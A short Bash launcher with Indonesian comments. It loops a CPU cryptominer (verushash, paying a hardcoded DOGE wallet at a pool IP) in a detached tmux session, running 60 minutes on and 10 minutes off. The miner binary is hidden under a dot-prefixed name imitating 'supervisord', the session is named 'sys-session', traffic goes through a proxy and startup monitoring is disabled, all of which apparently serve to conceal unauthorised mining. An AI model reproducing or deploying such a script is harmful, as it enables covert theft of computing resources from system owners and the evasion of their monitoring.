#!/bin/bash

while true
do
    echo "Menjalankan tmux selama 60 menit..."
    tmux new -d -s sys-session "timeout 60m ./.supervisord-wr --algorithm verushash --pool 103.249.70.7:3300 --disable-gpu --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=8POW --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8"
    
    # Tunggu hingga tmux selesai (60 menit)
    sleep 60m

    echo "Jeda 10 menit..."
    # Hentikan sesi tmux jika masih berjalan
    tmux kill-session -t sys-session

    # Tunggu selama 10 menit
    sleep 10m
done
